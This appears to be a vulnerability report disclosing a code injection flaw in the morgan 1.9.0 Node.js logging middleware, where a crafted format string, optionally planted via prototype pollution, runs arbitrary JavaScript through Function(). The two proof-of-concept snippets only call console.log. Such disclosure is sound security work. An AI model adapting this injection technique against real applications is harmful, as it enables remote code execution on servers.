Summary:

I would like to report a code injection vulnerability in morgan.
It allows an attacker to inject arbitrary JS commands in certain situations.

# Module

**module name:** morgan
**version:** 1.9.0
**npm page:** `https://www.npmjs.com/package/morgan`

## Module Description

HTTP request logger middleware for node.js

    Named after Dexter, a show you should not watch until completion.


## Module Stats

1,120,329 downloads in the last week

# Vulnerability

## Vulnerability Description

An attacker can use the format parameter to inject arbitrary commands

## Steps To Reproduce:

The basic attack vector looks like this: 
```js
var morgan = require('morgan');
var f = morgan('25 \\" + console.log(\'hello!\'); +  //:method :url :status :res[content-length] - :response-time ms');
f({}, {}, function () {
});
```
However, it is hard to believe that the package is used this way in any application. However, a more interesting attack vector is when combining this vulnerability with a prototype pollution one:

```js
var morgan = require('morgan');
//payload delivered through a prototype pollution attack
Object.prototype[':method :url :status :res[content-length] - :response-time ms'] = '25 \\" + console.log(\'hello!\'); +  //:method :url :status :res[content-length] - :response-time ms';
//benign looking usage of morgan that can be exploited due to the prototype pollution attack
var f = morgan(':method :url :status :res[content-length] - :response-time ms');
f({}, {}, function () {
});
```
Eval and it's variants like  Function() should almost neve be used in such popular packages.

## Patch

N/A remove the usage of Function().


# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

If combined with a prototype pollution attack this vulnerability is very serious (RCE). Otherwise, it is very unlikely that the attacker can control the vulnerable format parameter, but not impossible to think.
